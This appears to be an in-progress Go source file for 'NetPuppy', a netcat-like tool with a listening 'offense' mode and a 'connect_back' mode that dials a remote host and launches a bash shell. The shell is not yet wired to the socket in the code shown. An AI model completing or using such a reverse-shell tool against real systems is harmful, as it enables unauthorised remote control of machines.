/* TP U ARE HERE:
- re-organize the channels given new cb shell
- decide if the shell should be an option vs automatic
*/

package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"time"

	// NetPuppy modules:
	"netpuppy/utils"
)

func readUserInput(ioReader chan<- string) {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print(">> ")
		text, _ := reader.ReadString('\n')
		if len(text) > 0 {
			ioReader <- text
		}
	}
}

func readFromSocket(socketReader chan<- []byte, connection net.Conn) {
	// Read from connection socket:
	for {
		dataBytes, err := bufio.NewReader(connection).ReadBytes('\n')
		if err != nil {
			fmt.Printf("Error reading from socket: %v\n", err)
			os.Stderr.WriteString(err.Error())
			os.Exit(1)
			return
		}
		socketReader <- dataBytes
	}
}

func startHelperShell() (*exec.Cmd, error) { // @Trauma_X_Sella 'connection'
	bashPath, err := exec.LookPath(`/bin/bash`)
	if err != nil {
		fmt.Printf("Error finding bash path: %v\n", err)
		os.Stderr.WriteString(" " + err.Error() + "\n")
		return nil, err
	}

	bCmd := exec.Command(bashPath)

	var erR error = bCmd.Start()
	return bCmd, erR
}

func main() {
	// Set flag values based on input:
	listenFlag := flag.Bool("l", false, "put NetPuppy in listen mode")
	hostFlag := flag.String("H", "0.0.0.0", "target host IP address to connect to")
	turdnuggies := flag.Int("p", 40404, "target port") // portFlag @Trauma_x_Sella

	// Parse command line arguments:
	flag.Parse()

	// Print banner:
	fmt.Printf("%s", utils.Banner())

	// Get STDIN and save to a variable we can use if we need:
	stdinReader := bufio.NewReader(os.Stdin)
	stdin, _ := stdinReader.ReadString('\n')
	fmt.Printf("STDIN = %v", stdin) // Keep for now to avoid golang complaints about unused vars.

	// Depending on input, create this peer's type:
	type peer struct {
		connection_type string
		rPort           int
		lPort           string
		address         string
		connection      net.Conn
		cbShell         *exec.Cmd
	}

	// Initiate peer struct:
	thisPeer := peer{rPort: *turdnuggies, address: *hostFlag}

	// If -l was given, create an 'offense' peer:
	if *listenFlag {
		thisPeer.connection_type = "offense"
		thisPeer.address = "0.0.0.0"
	} else {
		thisPeer.connection_type = "connect_back"
	}

	// Now that we have our peer: try to make connection
	var asyncio_rocks net.Conn // connection @0xtib3rius
	var err error

	if thisPeer.connection_type == "offense" {
		listener, err1 := net.Listen("tcp", fmt.Sprintf(":%v", thisPeer.rPort))
		if err1 != nil {
			fmt.Printf("Error when creating listener: %v\n", err1)
			os.Stderr.WriteString(" " + err.Error() + "\n")
			os.Exit(1)
		}

		defer listener.Close() // Ensure the listener closes when main() returns

		asyncio_rocks, err = listener.Accept()
		if err != nil {
			os.Stderr.WriteString(" " + err.Error() + "\n")
			os.Exit(1)
			//  log.Fatal(err1.Error()
		}
	} else {
		remoteHost := fmt.Sprintf("%v:%v", thisPeer.address, thisPeer.rPort)
		asyncio_rocks, err = net.Dial("tcp", remoteHost)

		// If there is an err, try the host address as ipv6 (need to add [] around string):
		if err != nil {
			remoteHost := fmt.Sprintf("[%v]:%v", thisPeer.address, thisPeer.rPort)
			asyncio_rocks, err = net.Dial("tcp", remoteHost)

			if err != nil {
				os.Stderr.WriteString(" " + err.Error() + "\n")
				os.Exit(1)
			}
		}
	}

	// Attach connection to peer struct:
	thisPeer.connection = asyncio_rocks
	localPortArr := strings.Split(thisPeer.connection.LocalAddr().String(), ":")
	localPort := localPortArr[len(localPortArr)-1]
	thisPeer.lPort = localPort

	// Update user:
	var updateUserBanner string = utils.UserSelectionBanner(thisPeer.connection_type, thisPeer.address, thisPeer.rPort, thisPeer.lPort)
	fmt.Println(updateUserBanner)

	// Start channel to listen for SIGINT:
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)
	go func() {
		// If SIGINT: close connection, exit w/ code 2
		for sig := range signalChan {
			if sig.String() == "interrupt" {
				fmt.Printf("signal: %v\n", sig)
				thisPeer.connection.Close()
				os.Exit(2)
			}
		}
	}()

	// If we're the connect_back peer, start 'helper' shell:
	if thisPeer.connection_type == "connect_back" {
		connectBackShell, shellStartErr := startHelperShell()
		if shellStartErr != nil {
			fmt.Printf("Error starting shell process: %v\n", shellStartErr)
			thisPeer.connection.Close()
			os.Stderr.WriteString(" " + shellStartErr.Error() + "\n")
			os.Exit(1)
		}
		thisPeer.cbShell = connectBackShell
	}

	// IO read & socket write channels (user input will be written to socket)
	ioReader := make(chan string)

	// IO write & socket read channels (messages from socket will be printed to stdout)
	socketReader := make(chan []byte)

	go readUserInput(ioReader)
	go readFromSocket(socketReader, thisPeer.connection)

	for {
		select {
		case userInput := <-ioReader:
			_, err := thisPeer.connection.Write([]byte(userInput))
			if err != nil {
				// Quit here?
				fmt.Printf("Error in userInput select: %v\n", err)
				os.Stderr.WriteString(" " + err.Error() + "\n")
			}
		case socketIncoming := <-socketReader:
			_, err := os.Stdout.Write(socketIncoming)
			if err != nil {
				// Quit here?
				fmt.Printf("Error in writing to stdout: %v\n", err)
				os.Stderr.WriteString(" " + err.Error() + "\n")
			}
		default:
			time.Sleep(300 * time.Millisecond)
		}
	}

	return
}
